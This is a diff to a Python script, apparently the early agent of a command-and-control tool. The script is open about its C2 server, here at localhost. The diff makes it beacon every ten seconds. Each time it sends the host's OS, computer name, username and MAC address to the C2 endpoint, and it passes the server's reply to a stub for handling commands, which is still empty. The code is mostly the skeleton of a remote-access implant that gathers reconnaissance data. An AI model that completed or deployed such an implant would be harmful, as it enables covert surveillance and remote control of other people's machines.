@@ -6,12 +6,19 @@ Agent
 
 import os
 import re
+import time
+import uuid
+
 import requests
 
 INDEX_COMPUTER_NAME = 0
 INDEX_USERNAME = 1
 RE_DATA_AFTER_MULTIPLE_SPACES = r'(.*): +(.*)'
-C2 = r'http://127.0.0.1:8000/get'
+C2 = r'http://127.0.0.1:8000/api/{}/get'
+
+
+def get_mac():
+    return ':'.join(re.findall('..', '%012x' % uuid.getnode()))
 
 
 def get_os():
@@ -33,19 +40,24 @@ def get_computer_and_username():
     return output_whoami.read().strip().split('\\')
 
 
+def process_response(unchecked_cmd):
+    pass
+
+
 def say_hello():
     post_object = {
         'operating_system': get_os(),
         'computer_name': get_computer_and_username()[INDEX_COMPUTER_NAME],
         'username': get_computer_and_username()[INDEX_USERNAME]
     }
-    res = requests.post(C2, data = post_object)
-
-    print(res.text)
+    res = requests.post(C2.format(get_mac()), data=post_object)
+    process_response(res.text)
 
 
 def main():
-    say_hello()
+    while True:
+        time.sleep(10)
+        say_hello()
 
 
 if __name__ == '__main__':
